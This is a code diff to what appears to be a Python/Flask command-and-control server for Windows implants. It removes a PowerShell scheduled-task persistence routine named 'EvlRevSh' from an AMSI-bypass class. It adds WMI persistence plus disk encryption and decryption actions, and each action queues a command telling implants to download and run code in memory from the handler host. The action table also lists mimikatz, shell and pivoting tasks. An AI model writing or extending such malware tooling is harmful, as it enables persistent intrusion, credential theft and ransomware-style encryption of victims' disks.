@@ -98,17 +98,6 @@ class AmsiBypass:
         payload = "powershell.exe -WindowStyle Hidden -exec bypass -C "+'"'+self._execute_cmd_bypamsi(payload)+'"'
         return payload
 
-    def download_and_execute_ps1_persistance(self,url):
-        self.tech = "moderate"
-        payload = self.download_and_execute_ps1(url).replace('"',"")
-        payload = payload.replace('powershell.exe','')
-        payload = payload[1:]
-        final = ''
-        final += f'$A = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "{payload}";'
-        final += '$T = New-ScheduledTaskTrigger -AtLogOn;'
-        final += 'Register-ScheduledTask EvlRevSh -Action $A -Trigger $T;'
-        return final
-
 ##### AMSI BYPASS
 
 
@@ -205,6 +194,39 @@ def lnk(id):
     command = f"MemRunPy:http://{handler_host}/download/?file=lnk_hijacking.txt"
     write_command(id,command)
 
+def wmi(id):
+    print("+--------------------+")
+    print("|  Persistence : WMI |")
+    print("+--------------------+")
+    with open('./commands_templates/wmi_persistence.py',"r") as file:
+        data = file.read()
+    with open("./uploads/wmi_persistence.txt","w") as file:
+        file.write(data)
+    command = f"MemRunPy:http://{handler_host}/download/?file=wmi_persistence.txt"
+    write_command(id,command)
+
+def encrypt_d(id):
+    print("+------------------+")
+    print("|  Disk Encryption |")
+    print("+------------------+")
+    with open('./commands_templates/encrypt_disk.py',"r") as file:
+        data = file.read()
+    with open("./uploads/encrypt_disk.txt","w") as file:
+        file.write(data)
+    command = f"MemRunPy:http://{handler_host}/download/?file=encrypt_disk.txt"
+    write_command(id,command)
+
+def decrypt_d(id):
+    print("+------------------+")
+    print("|  Disk Decryption |")
+    print("+------------------+")
+    with open('./commands_templates/decrypt_disk.py',"r") as file:
+        data = file.read()
+    with open("./uploads/decrypt_disk.txt","w") as file:
+        file.write(data)
+    command = f"MemRunPy:http://{handler_host}/download/?file=decrypt_disk.txt"
+    write_command(id,command)
+
 def pivote():
     print("+-----------+")
     print("|   Pivote  |")
@@ -248,7 +270,7 @@ global app
 app = Flask(__name__)
 
 global dico_action
-dico_action = {1:mimikatz,2:shell,3:lnk,4:pivote}
+dico_action = {1:mimikatz,2:shell,3:lnk,4:pivote,5:wmi,6:encrypt_d,7:decrypt_d}
 
 
 @app.route('/')
